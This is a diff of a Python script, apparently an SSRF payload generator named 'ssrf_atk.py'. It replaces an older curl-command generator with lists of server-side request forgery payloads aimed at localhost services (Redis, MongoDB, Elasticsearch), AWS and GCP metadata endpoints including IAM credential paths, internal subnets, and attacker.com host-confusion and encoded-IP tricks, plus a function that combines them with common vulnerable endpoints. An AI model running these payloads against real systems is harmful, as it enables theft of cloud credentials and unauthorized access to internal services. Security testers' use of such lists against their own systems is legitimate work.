@@ -1,68 +1,53 @@
+"""
+tools/ssrf_atk.py — Server-Side Request Forgery attack payload generator
+"""
 import random
-import urllib.parse
 
-TARGET = "http://localhost/test?"
-
-PARAMS = [
-    "url", "uri", "dest", "redirect", "next",
-    "callback", "fetch", "image", "path", "data"
+_LOCALHOST = [
+    "http://127.0.0.1/admin",
+    "http://127.0.0.1:8080/internal",
+    "http://localhost/admin",
+    "http://localhost:9200/_cat/indices",  # Elasticsearch
+    "http://127.0.0.1:6379/",             # Redis
+    "http://127.0.0.1:27017/",            # MongoDB
 ]
 
-INTERNAL_TARGETS = [
-    "http://127.0.0.1",
-    "http://localhost",
-    "http://169.254.169.254",
-    "http://10.0.0.1",
-    "http://192.168.1.1",
-    "http://172.16.0.1",
-    "http://[::1]"
+_AWS_METADATA = [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://169.254.169.254/latest/user-data/",
+    "http://169.254.169.254/2019-10-01/meta-data/ami-id",
 ]
 
-# Obfuscated internal IP formats
-OBFUSCATED_TARGETS = [
-    "http://2130706433",          # decimal 127.0.0.1
-    "http://0x7f000001",          # hex 127.0.0.1
-    "http://0177.0.0.1",          # octal-like
+_GCP_METADATA = [
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
 ]
 
-PATHS = [
-    "/admin",
-    "/dashboard",
-    "/config",
-    "/metadata",
-    "/test",
-    "/internal"
+_INTERNAL_SUBNET = [
+    "http://10.0.0.1/admin",
+    "http://192.168.1.1/config",
+    "http://172.16.0.1/management",
+    "http://10.0.0.100:8080/api/internal",
 ]
 
-def random_case(s):
-    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)
+_DNS_REBINDING = [
+    "http://attacker.com@127.0.0.1/admin",
+    "http://127.0.0.1.attacker.com/",
+    "http://0x7f000001/",        # 127.0.0.1 in hex
+    "http://2130706433/",        # 127.0.0.1 in decimal
+    "http://0177.0.0.1/admin",   # 127.0.0.1 in octal
+]
 
-def maybe_encode(s):
-    if random.random() > 0.5:
-        s = urllib.parse.quote(s)
-    if random.random() > 0.7:
-        s = urllib.parse.quote(s)
-    return s
+ALL_PAYLOADS = _LOCALHOST + _AWS_METADATA + _GCP_METADATA + _INTERNAL_SUBNET + _DNS_REBINDING
 
-def generate_payload():
-    base = random.choice(INTERNAL_TARGETS + OBFUSCATED_TARGETS)
-    path = random.choice(PATHS)
-    payload = base + path
+SSRF_PATHS  = ["/proxy", "/fetch", "/request", "/load", "/api/proxy", "/webhook", "/redirect"]
+SSRF_PARAMS = ["url", "target", "host", "src", "redirect", "callback", "endpoint"]
 
-    if random.random() > 0.5:
-        payload = random_case(payload)
 
-    payload = maybe_encode(payload)
-
-    return payload
-
-generated = set()
-
-while len(generated) < 100:
-    param = random.choice(PARAMS)
-    payload = generate_payload()
-    curl_cmd = f'curl "{TARGET}{param}={payload}"'
-    generated.add(curl_cmd)
-
-for cmd in generated:
-    print(cmd)
+def generate() -> tuple[str, str]:
+    payload = random.choice(ALL_PAYLOADS)
+    path    = random.choice(SSRF_PATHS)
+    param   = random.choice(SSRF_PARAMS)
+    url     = f"http://localhost:8000{path}?{param}={payload}"
+    return url, payload
